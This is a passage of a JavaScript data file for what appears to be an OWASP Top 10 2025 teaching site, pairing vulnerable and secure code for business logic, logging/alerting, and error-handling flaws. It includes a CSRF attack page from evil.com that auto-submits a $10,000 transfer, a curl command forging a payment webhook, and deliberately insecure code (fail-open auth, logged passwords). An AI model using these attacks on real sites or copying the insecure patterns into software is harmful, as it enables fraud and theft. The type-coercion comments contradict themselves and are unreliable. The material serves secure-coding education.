// JavaScript cart:
const cart = {
  items: [
    { id: 'WIDGET-001', name: 'Widget', price: 49.99, qty: 1 }
  ],
  total: 49.99
};

// Attacker opens DevTools and changes:
// cart.items[0].price = 0.01
// Or modifies the hidden input: value="0.01"
// Or intercepts the POST request and changes price to 0.01
//
// Server trusts the client-submitted price: $0.01 charged.`,
        secureCode: `// Secure: Server is the source of truth for pricing
// Client sends only product ID and quantity

// Frontend:
const cart = {
  items: [
    { id: 'WIDGET-001', qty: 1 }
    // No price stored client-side!
  ]
};

async function checkout() {
  const response = await fetch('/api/checkout', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      items: cart.items.map(i => ({
        productId: i.id,
        quantity: i.qty
        // Price is NOT sent — server looks it up
      }))
    })
  });
  return response.json();
}

// Server:
app.post('/api/checkout', authenticate, async (req, res) => {
  let total = 0;
  const lineItems = [];

  for (const item of req.body.items) {
    // Look up the REAL price from the database
    const product = await db.products.findById(item.productId);
    if (!product) throw new Error('Product not found');

    const lineTotal = product.price * item.quantity;
    total += lineTotal;
    lineItems.push({ ...product, quantity: item.quantity });
  }

  // Charge the server-calculated total
  const charge = await stripe.charges.create({ amount: total });
  res.json({ orderId: charge.id, total });
});`,
      },
      {
        title: "Missing CSRF Protection",
        vulnerableCode: `<!-- Vulnerable: No CSRF token on state-changing forms -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="alice">
  <input name="amount" value="100">
  <button type="submit">Transfer</button>
</form>

<!-- Attacker's page at https://evil.com/ -->
<h1>Click here to win a prize!</h1>
<form action="https://bank.com/transfer" method="POST"
      id="csrfForm" style="display:none;">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>
  // Auto-submits the hidden form
  document.getElementById('csrfForm').submit();
  // User's browser sends their bank cookies automatically
  // The bank sees a valid authenticated request
  // $10,000 is transferred to the attacker
</script>`,
        secureCode: `// Secure: CSRF token + SameSite cookies
// Server generates a unique CSRF token per session
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
  }
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// Template includes the token in every form:
// <form action="/transfer" method="POST">
//   <input type="hidden" name="_csrf"
//          value="<%= csrfToken %>">
//   ...
// </form>

// Middleware validates token on state-changing requests
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    const token = req.body._csrf || req.headers['x-csrf-token'];
    if (token !== req.session.csrfToken) {
      return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
});

// Additionally: SameSite cookies prevent cross-origin sending
// Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly
// The attacker's form at evil.com won't include the cookie.`,
      },
      {
        title: "Unverified Webhook Payloads",
        vulnerableCode: `// Vulnerable: Trusting webhook data without verification
app.post('/webhooks/payment', (req, res) => {
  const event = req.body;

  // Blindly trusts the incoming JSON
  if (event.type === 'payment.completed') {
    const orderId = event.data.orderId;
    const amount = event.data.amount;

    // Mark order as paid based on unverified data!
    db.orders.update(orderId, {
      status: 'paid',
      amountPaid: amount
    });

    fulfillOrder(orderId);
  }

  res.json({ received: true });
});

// Attacker sends a fake webhook:
// curl -X POST https://yoursite.com/webhooks/payment \\
//   -d '{"type":"payment.completed",
//        "data":{"orderId":"ORD-123","amount":0}}'
// Order marked as paid without any real payment!`,
        secureCode: `// Secure: Verify webhook signature before processing
const WEBHOOK_SECRET = process.env.STRIPE_WEBHOOK_SECRET;

app.post('/webhooks/payment',
  express.raw({ type: 'application/json' }),
  (req, res) => {
    const signature = req.headers['stripe-signature'];

    let event;
    try {
      // Verify the signature using the shared secret
      event = stripe.webhooks.constructEvent(
        req.body,        // Raw body (not parsed)
        signature,       // Signature from headers
        WEBHOOK_SECRET   // Your webhook secret
      );
    } catch (err) {
      securityLogger.warn({
        event: 'WEBHOOK_VERIFICATION_FAILED',
        error: err.message
      });
      return res.status(400).json({ error: 'Invalid signature' });
    }

    // Signature verified — safe to process
    if (event.type === 'payment_intent.succeeded') {
      // Additional: verify the amount matches your records
      const order = db.orders.findById(event.data.object.metadata.orderId);
      if (order.total !== event.data.object.amount) {
        securityLogger.critical({ event: 'AMOUNT_MISMATCH' });
        return res.status(400).json({ error: 'Amount mismatch' });
      }

      db.orders.update(order.id, { status: 'paid' });
    }

    res.json({ received: true });
  }
);`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A09: Security Logging and Alerting Failures
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a09",
    code: "A09:2025",
    title: "Security Logging and Alerting Failures",
    prevCode: "A09:2021",
    prevTitle: "Security Logging and Monitoring Failures",
    badge: { text: "Renamed — Same #9", type: "same" },
    description:
      "Without adequate logging and active alerting, breaches go undetected, incidents can't be investigated, and organizations lose visibility into their security posture.",
    comparison:
      'Renamed from "Monitoring" to <strong>"Alerting"</strong> in 2025. This subtle but important shift emphasizes the need for <em>proactive, automated detection and notification</em> rather than passive log collection. Position unchanged at #9.',
    sandbox: {
      title: "Security Event Logging",
      description:
        "Perform actions (login attempts, data access) and see the difference between an app with no logging versus one that records security events with timestamps, severity levels, and automated alerts.",
      vulnerableLabel: "Vulnerable: No Logging",
      secureLabel: "Secure: Full Audit Trail + Alerts",
    },
    examples: [
      {
        title: "No Security Logging",
        vulnerableCode: `// Vulnerable: No security logging at all
function login(username, password) {
  const user = users[username];
  if (user && user.password === password) {
    return { success: true };
  }
  // Failed login — no record, no alert, no trace
  return { success: false };
}

function accessRecord(userId, recordId) {
  // Sensitive data accessed — no audit log
  return database.get(recordId);
}

function changePermissions(targetUser, newRole) {
  // Privilege escalation — completely invisible
  targetUser.role = newRole;
}

// An attacker can:
// 1. Brute-force logins undetected
// 2. Access sensitive data with no trail
// 3. Escalate privileges silently
// 4. Remain undetected for months (average: 204 days)`,
        secureCode: `// Secure: Comprehensive logging + alerting
const SecurityLogger = {
  log(event) {
    const entry = {
      timestamp: new Date().toISOString(),
      ...event,
      sessionId: getSessionId(),
      ip: getClientIP(),
      userAgent: navigator.userAgent
    };
    auditLog.push(entry);

    if (event.severity === 'HIGH' || event.severity === 'CRITICAL') {
      triggerAlert(entry);
    }
    return entry;
  }
};

function login(username, password) {
  const user = users[username];
  if (user && user.password === password) {
    SecurityLogger.log({
      event: 'AUTH_SUCCESS', severity: 'INFO',
      user: username
    });
    return { success: true };
  }

  SecurityLogger.log({
    event: 'AUTH_FAILURE', severity: 'WARN',
    user: username, detail: 'Invalid credentials'
  });

  if (getRecentFailures(username) >= 5) {
    SecurityLogger.log({
      event: 'BRUTE_FORCE_DETECTED', severity: 'CRITICAL',
      user: username
    });
  }
  return { success: false };
}`,
      },
      {
        title: "Logging Sensitive Data (Passwords, Tokens)",
        vulnerableCode: `// Vulnerable: Logging sensitive information
function login(req, res) {
  const { email, password } = req.body;

  // Logs the actual password!
  logger.info('Login attempt', {
    email: email,
    password: password,    // NEVER log passwords!
    headers: req.headers   // May contain auth tokens
  });

  const user = authenticate(email, password);
  if (user) {
    const token = generateToken(user);
    logger.info('Login successful', {
      token: token,         // NEVER log session tokens!
      user: user            // May include PII, password hash
    });
    res.json({ token });
  }
}

// Log file now contains:
// {"email":"alice@co.com","password":"MySecret123!"}
// {"token":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOi..."}
// If logs are breached, ALL credentials are exposed.`,
        secureCode: `// Secure: Structured logging without sensitive data
function login(req, res) {
  const { email, password } = req.body;

  // Log the event, not the credentials
  logger.info('Login attempt', {
    email: maskEmail(email),   // "a***@co.com"
    ip: req.ip,
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString()
    // NO password, NO token, NO full email
  });

  const user = authenticate(email, password);
  if (user) {
    const token = generateToken(user);
    logger.info('Login successful', {
      userId: user.id,            // Internal ID only
      email: maskEmail(email),
      sessionCreated: true
      // NO token value, NO user object
    });
    res.json({ token });
  }
}

function maskEmail(email) {
  const [local, domain] = email.split('@');
  return local[0] + '***@' + domain;
}

// Logs are safe even if breached:
// {"email":"a***@co.com","ip":"1.2.3.4","sessionCreated":true}`,
      },
      {
        title: "No Log Integrity Protection",
        vulnerableCode: `// Vulnerable: Logs stored as plain text files
const fs = require('fs');

function logEvent(event) {
  const line = JSON.stringify(event) + '\\n';
  fs.appendFileSync('/var/log/app/security.log', line);
}

// Problems:
// 1. An attacker with file access can DELETE log entries
//    to cover their tracks
//
// 2. Logs can be MODIFIED to frame another user:
//    Original: {"user":"attacker","action":"delete_all"}
//    Modified: {"user":"intern","action":"delete_all"}
//
// 3. No tamper detection — nobody knows logs were changed
//
// 4. Logs on the same server as the app — if the server
//    is compromised, logs are compromised too
//
// 5. No timestamps from a trusted source
//    Attacker can backdate events`,
        secureCode: `// Secure: Tamper-evident, append-only remote logging
const crypto = require('crypto');

class SecureLogger {
  constructor() {
    this.previousHash = '0'.repeat(64);
  }

  log(event) {
    const entry = {
      ...event,
      timestamp: new Date().toISOString(),
      sequence: this.sequence++,
      // Chain hash: links each entry to the previous one
      previousHash: this.previousHash
    };

    // Hash this entry (includes previous hash → chain)
    entry.hash = crypto.createHash('sha256')
      .update(JSON.stringify(entry))
      .digest('hex');
    this.previousHash = entry.hash;

    // Write to multiple destinations simultaneously
    // 1. Local (fast, may be compromised)
    localLogger.write(entry);

    // 2. Remote SIEM (append-only, separate permissions)
    siem.send(entry);

    // 3. Immutable storage (S3 with Object Lock)
    s3.putObject({
      Bucket: 'audit-logs',
      Key: \`\${entry.timestamp}-\${entry.hash}.json\`,
      Body: JSON.stringify(entry),
      ObjectLockMode: 'COMPLIANCE',
      ObjectLockRetainUntilDate: retentionDate(365)
    });
  }
}

// If an attacker modifies any entry, the hash chain breaks.
// Remote/immutable copies are out of attacker's reach.`,
      },
      {
        title: "Missing Alert Thresholds",
        vulnerableCode: `// Vulnerable: Logs exist but nobody watches them
function securityLog(event) {
  // Writes to a log file and... that's it
  console.log(JSON.stringify(event));
  fs.appendFileSync('security.log', JSON.stringify(event));
}

// These events are logged but never trigger alerts:
securityLog({ event: 'LOGIN_FAILURE', user: 'admin' });
securityLog({ event: 'LOGIN_FAILURE', user: 'admin' });
securityLog({ event: 'LOGIN_FAILURE', user: 'admin' });
// ... 10,000 more failures — nobody notices

securityLog({ event: 'PERMISSION_CHANGE', role: 'admin' });
// A user granted themselves admin — no alert

securityLog({ event: 'DATA_EXPORT', records: 50000 });
// 50,000 records exported — no alert

// Average time to detect a breach: 204 days (IBM 2023)
// Logs without alerting are forensic evidence at best
// — too late to prevent the damage.`,
        secureCode: `// Secure: Automated alert rules with escalation
const alertRules = [
  {
    name: 'Brute Force Detection',
    condition: (events) =>
      events.filter(e => e.event === 'LOGIN_FAILURE'
        && e.timestamp > fiveMinutesAgo()
      ).length >= 5,
    severity: 'HIGH',
    action: 'lockAccount'
  },
  {
    name: 'Privilege Escalation',
    condition: (events) =>
      events.some(e => e.event === 'PERMISSION_CHANGE'
        && e.newRole === 'admin'),
    severity: 'CRITICAL',
    action: 'notifySOC'
  },
  {
    name: 'Mass Data Export',
    condition: (events) =>
      events.some(e => e.event === 'DATA_EXPORT'
        && e.records > 1000),
    severity: 'HIGH',
    action: 'notifyDLP'
  }
];

// Real-time event processor
function processEvent(event) {
  securityLog(event);
  recentEvents.push(event);

  for (const rule of alertRules) {
    if (rule.condition(recentEvents)) {
      triggerAlert({
        rule: rule.name,
        severity: rule.severity,
        event,
        action: rule.action
      });
    }
  }
}

// Alerts sent via: PagerDuty, Slack, email, SMS
// Response time target: < 15 minutes for CRITICAL`,
      },
      {
        title: "Client-Side Only Logging",
        vulnerableCode: `// Vulnerable: Security events logged only in the browser
function onLoginFailure(username) {
  // Only logs to browser console
  console.warn('Login failed for:', username);
}

function onSuspiciousActivity(details) {
  // Logs to localStorage — attacker can clear it
  const logs = JSON.parse(
    localStorage.getItem('securityLogs') || '[]'
  );
  logs.push({ ...details, time: Date.now() });
  localStorage.setItem('securityLogs', JSON.stringify(logs));
}

// Problems:
// 1. console.log/warn disappear when tab is closed
// 2. localStorage is clearable by the attacker:
//    localStorage.removeItem('securityLogs')
// 3. No server-side record of security events
// 4. Cannot correlate events across users/sessions
// 5. Cannot trigger automated responses
// 6. Useless for forensics after an incident`,
        secureCode: `// Secure: Client-side events forwarded to server
const SecurityTelemetry = {
  queue: [],
  flushInterval: 5000,

  track(event) {
    this.queue.push({
      ...event,
      timestamp: new Date().toISOString(),
      sessionId: getSessionId(),
      page: window.location.pathname,
      userAgent: navigator.userAgent
    });

    // Flush immediately for high-severity events
    if (event.severity === 'HIGH' || event.severity === 'CRITICAL') {
      this.flush();
    }
  },

  async flush() {
    if (this.queue.length === 0) return;
    const batch = this.queue.splice(0);

    try {
      // Use sendBeacon for reliability (survives page close)
      const payload = JSON.stringify(batch);
      if (navigator.sendBeacon) {
        navigator.sendBeacon('/api/security-events', payload);
      } else {
        await fetch('/api/security-events', {
          method: 'POST',
          body: payload,
          keepalive: true
        });
      }
    } catch {
      // Re-queue on failure
      this.queue.unshift(...batch);
    }
  }
};

// Auto-flush periodically
setInterval(() => SecurityTelemetry.flush(), 5000);
// Flush on page unload
window.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') {
    SecurityTelemetry.flush();
  }
});`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A10: Mishandling of Exceptional Conditions
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a10",
    code: "A10:2025",
    title: "Mishandling of Exceptional Conditions",
    prevCode: null,
    prevTitle: null,
    badge: { text: "NEW", type: "new" },
    description:
      'A brand-new category covering programs that fail to prevent, detect, and respond to unusual situations. This includes errors that "fail open" (granting access on error), stack traces exposed to users, and inconsistent exception handling.',
    comparison:
      "<strong>Entirely new in 2025.</strong> Replaces A10:2021 (SSRF), which was merged into Broken Access Control. This category covers 24 CWEs related to improper error handling and reflects a key principle: secure software must fail safely and predictably. It was added based on community survey input highlighting the frequency and severity of error-handling failures.",
    sandbox: {
      title: "Fail Open vs. Fail Closed",
      description:
        'Simulate an authorization check where the backend service is down. The vulnerable version "fails open" and grants access. The secure version "fails closed" and denies access. Click to trigger the failing auth service.',
      vulnerableLabel: 'Vulnerable: "Fail Open"',
      secureLabel: 'Secure: "Fail Closed"',
    },
    examples: [
      {
        title: '"Fail Open" Authorization',
        vulnerableCode: `// Vulnerable: "Fail Open" — errors grant access
async function checkAuthorization(userId, resource) {
  try {
    const response = await fetch(
      '/api/auth?user=' + userId + '&resource=' + resource
    );
    const data = await response.json();
    return data.authorized;
  } catch (error) {
    // Service is down or network error
    console.log('Auth service unavailable, allowing access');
    return true; // ← FAIL OPEN: grants access on error!
  }
}

// Also vulnerable: Leaking stack traces
app.get('/api/data', (req, res) => {
  try {
    const data = processRequest(req);
    res.json(data);
  } catch (error) {
    res.status(500).json({
      error: error.message,
      stack: error.stack,  // ← Exposes file paths, versions
      query: req.query     // ← Echoes back user input
    });
  }
});`,
        secureCode: `// Secure: "Fail Closed" — errors deny access
async function checkAuthorization(userId, resource) {
  try {
    const response = await fetch(
      '/api/auth?user=' + userId + '&resource=' + resource
    );
    if (!response.ok) {
      throw new Error('Auth service returned ' + response.status);
    }
    const data = await response.json();
    return data.authorized === true; // Strict boolean check
  } catch (error) {
    securityLogger.log({
      event: 'AUTH_ERROR', severity: 'HIGH',
      userId, resource, error: error.message
    });
    return false; // ← Deny by default
  }
}

// Safe error responses
app.get('/api/data', (req, res) => {
  try {
    const data = processRequest(req);
    res.json(data);
  } catch (error) {
    const errorId = crypto.randomUUID();
    internalLogger.error({ errorId, error });
    res.status(500).json({
      error: 'An unexpected error occurred.',
      referenceId: errorId
    });
  }
});`,
      },
      {
        title: "Exposed Stack Traces",
        vulnerableCode: `// Vulnerable: Full error details sent to the client
app.use((err, req, res, next) => {
  res.status(500).json({
    message: err.message,
    // Full stack trace exposed:
    stack: err.stack,
    // "Error: ECONNREFUSED 10.0.1.5:5432
    //    at TCPConnectWrap (/app/node_modules/pg/...)
    //    at Object.<anonymous> (/app/src/db/pool.js:23:8)"

    // Reveals:
    // - Database IP address: 10.0.1.5
    // - Database port: 5432 (PostgreSQL)
    // - File paths: /app/src/db/pool.js
    // - Library versions from node_modules paths
    // - Internal service architecture

    // Often combined with req context:
    sql: err.sql,      // Leaked SQL query
    params: err.params // Leaked query parameters
  });
});`,
        secureCode: `// Secure: User-friendly error with internal-only logging
const ERROR_MESSAGES = {
  VALIDATION: 'The provided data is invalid.',
  NOT_FOUND: 'The requested resource was not found.',
  UNAUTHORIZED: 'Authentication required.',
  FORBIDDEN: 'You do not have permission.',
  RATE_LIMITED: 'Too many requests. Please wait.',
  DEFAULT: 'An unexpected error occurred.'
};

app.use((err, req, res, next) => {
  const errorId = crypto.randomUUID();

  // Full details logged internally
  logger.error({
    errorId,
    message: err.message,
    stack: err.stack,
    url: req.originalUrl,
    method: req.method,
    userId: req.user?.id
  });

  // Generic message to client
  const statusCode = err.statusCode || 500;
  const category = err.category || 'DEFAULT';

  res.status(statusCode).json({
    error: ERROR_MESSAGES[category] || ERROR_MESSAGES.DEFAULT,
    referenceId: errorId
    // No stack, no SQL, no internal paths, no params
  });
});`,
      },
      {
        title: "Unhandled Promise Rejections",
        vulnerableCode: `// Vulnerable: Unhandled promise rejections crash the app
async function processOrder(orderId) {
  const order = await db.orders.findById(orderId);
  const payment = await chargeCard(order.total);
  const shipping = await createShipment(order);
  // If chargeCard fails, createShipment never runs
  // If createShipment fails, order is charged but not shipped
  // No cleanup, no rollback, inconsistent state
}

// Called without catch:
app.post('/api/orders/:id/process', async (req, res) => {
  processOrder(req.params.id);
  // No await! Fire and forget
  // If it fails, the error is completely lost
  res.json({ message: 'Processing started' });
});

// Node.js default: unhandled rejection = crash in production
// UnhandledPromiseRejectionWarning → process exits
// All in-flight requests are dropped
// Users see ERR_CONNECTION_REFUSED`,
        secureCode: `// Secure: Proper async error handling + compensating actions
async function processOrder(orderId) {
  const order = await db.orders.findById(orderId);
  let paymentId = null;

  try {
    // Step 1: Charge the card
    const payment = await chargeCard(order.total);
    paymentId = payment.id;

    // Step 2: Create shipment
    const shipping = await createShipment(order);

    // Step 3: Update order status
    await db.orders.update(orderId, {
      status: 'completed',
      paymentId,
      trackingNumber: shipping.tracking
    });
  } catch (error) {
    // Compensating action: refund if payment was taken
    if (paymentId) {
      await refundPayment(paymentId).catch(refundErr => {
        logger.critical({
          event: 'REFUND_FAILED', orderId, paymentId,
          error: refundErr.message
        });
        // Alert for manual intervention
      });
    }

    await db.orders.update(orderId, {
      status: 'failed', error: error.message
    });

    throw error; // Re-throw for the route handler
  }
}

// Route properly awaits and catches
app.post('/api/orders/:id/process', async (req, res) => {
  try {
    await processOrder(req.params.id);
    res.json({ status: 'completed' });
  } catch (error) {
    res.status(500).json({ error: 'Order processing failed' });
  }
});

// Global safety net
process.on('unhandledRejection', (reason) => {
  logger.critical({ event: 'UNHANDLED_REJECTION', reason });
  // Graceful shutdown instead of hard crash
});`,
      },
      {
        title: "Type Coercion Errors in Validation",
        vulnerableCode: `// Vulnerable: JavaScript type coercion bypasses checks
function isAdmin(user) {
  // Loose equality (==) allows type coercion
  if (user.role == true) {
    return true;  // Intended: only role === 'admin'
  }
  return false;
}

// user.role = 1 → 1 == true → TRUE (bypasses check!)
// user.role = "1" → "1" == true → TRUE

function validateDiscount(code, amount) {
  // No type checking on amount
  if (amount > 0 && amount < 100) {
    applyDiscount(amount);
  }
}

// amount = "99.99" → "99.99" > 0 → true (string comparison)
// amount = "999" → "999" < 100 → true (lexicographic!)
// Because "999" < "100" is false, but "999" < 100 is...
// Actually "999" > 0 is true, "999" < 100 is false.
// But: amount = [] → [] > 0 → false, safe by accident
// amount = [50] → [50] > 0 → true, [50] < 100 → true!`,
        secureCode: `// Secure: Strict type checking and validation
function isAdmin(user) {
  // Strict equality — no type coercion
  if (typeof user.role !== 'string') {
    return false;
  }
  return user.role === 'admin';
}

function validateDiscount(code, amount) {
  // Explicit type validation
  if (typeof amount !== 'number' || !Number.isFinite(amount)) {
    throw new TypeError('amount must be a finite number');
  }

  if (amount <= 0 || amount >= 100) {
    throw new RangeError('amount must be between 0 and 100');
  }

  applyDiscount(amount);
}

// Even better: use a validation library
const { z } = require('zod');

const DiscountSchema = z.object({
  code: z.string().min(1).max(50),
  amount: z.number().positive().max(99.99)
});

function validateDiscountZod(input) {
  const result = DiscountSchema.safeParse(input);
  if (!result.success) {
    throw new Error('Validation failed: '
      + result.error.issues.map(i => i.message).join(', '));
  }
  return result.data; // Typed, validated, safe
}`,
      },
      {
        title: "No Timeout on External Calls",
        vulnerableCode: `// Vulnerable: No timeout on external service calls
async function getUserProfile(userId) {
  // If the service hangs, this waits FOREVER
  const response = await fetch(
    'https://api.external.com/users/' + userId
  );
  return response.json();
}

async function processPayment(order) {
  // Payment API hangs → request hangs → thread blocked
  const result = await fetch('https://payments.example.com/charge', {
    method: 'POST',
    body: JSON.stringify(order)
  });
  return result.json();
}

// Consequences of no timeouts:
// 1. One slow service cascades to entire application
// 2. Thread pool exhaustion — no new requests handled
// 3. Memory grows as pending requests accumulate
// 4. User sees infinite loading spinner
// 5. Attackers can exploit: slow requests = easy DoS`,
        secureCode: `// Secure: Timeouts + circuit breaker pattern
async function getUserProfile(userId) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 5000);

  try {
    const response = await fetch(
      'https://api.external.com/users/' + userId,
      { signal: controller.signal }
    );

    if (!response.ok) {
      throw new Error('Service returned ' + response.status);
    }

    return await response.json();
  } catch (error) {
    if (error.name === 'AbortError') {
      logger.warn({ event: 'EXTERNAL_TIMEOUT', userId });
      // Return cached/fallback data instead of failing
      return getCachedProfile(userId) || { name: 'Unknown' };
    }
    throw error;
  } finally {
    clearTimeout(timeout);
  }
}

// Circuit breaker: stop calling a failing service
class CircuitBreaker {
  constructor(fn, { threshold = 5, resetMs = 30000 } = {}) {
    this.fn = fn;
    this.failures = 0;
    this.threshold = threshold;
    this.resetMs = resetMs;
    this.state = 'CLOSED'; // CLOSED → OPEN → HALF_OPEN
  }

  async call(...args) {
    if (this.state === 'OPEN') {
      throw new Error('Circuit breaker is OPEN');
    }
    try {
      const result = await this.fn(...args);
      this.failures = 0;
      this.state = 'CLOSED';
      return result;
    } catch (error) {
      this.failures++;
      if (this.failures >= this.threshold) {
        this.state = 'OPEN';
        setTimeout(() => { this.state = 'HALF_OPEN'; }, this.resetMs);
      }
      throw error;
    }
  }
}`,
      },
    ],
  },
];
